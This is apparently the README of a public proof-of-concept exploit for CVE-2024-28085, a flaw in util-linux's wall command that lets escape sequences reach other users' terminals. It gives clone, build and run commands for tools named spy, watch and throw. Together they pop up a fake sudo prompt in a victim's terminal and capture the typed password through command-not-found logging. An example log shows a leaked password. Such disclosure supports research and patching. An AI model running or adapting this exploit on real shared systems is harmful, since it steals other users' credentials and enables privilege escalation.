# Wall-Escape (CVE-2024-28085)

The util-linux wall command does not filter escape sequences from 
command line arguments. The vulnerable code was introduced in commit
cdd3cc7fa4 (2013). Every version since has been vulnerable. Full report
[here](https://people.rit.edu/sjf5462/6831711781/wall_2_27_2024.txt).

## Configure

Make sure the background color and username are set to appropriate values in
throw.c.

## Build and run

Attack setup
```
git clone https://github.com/skyler-ferrante/CVE-2024-28085.git
./build.sh
./spy > proc.log & ./watch "sudo systemctl start apache2"; ./watch "systemctl start apache2"; sleep .01; ./throw
```

It is possible to use any command that is not long running.
Make sure to kill spy after the exploit has run: `pkill spy`.

Then in another terminal
```
sudo su
sudo systemctl start apache2
```

This should cause the fake sudo prompt to pop up in the victim terminal. Since
many systems leak commands that are not found, the victim password may show up in proc.log.

Note that it might not be necessary to call `su` depending on the system.

Example proc.log
```
sudo systemctl start apache2
systemctl start apache2
./throw
bash
/usr/bin/python3 /usr/lib/command-not-found -- Password123!
/usr/bin/snap advise-snap --format=json --command Password123!
```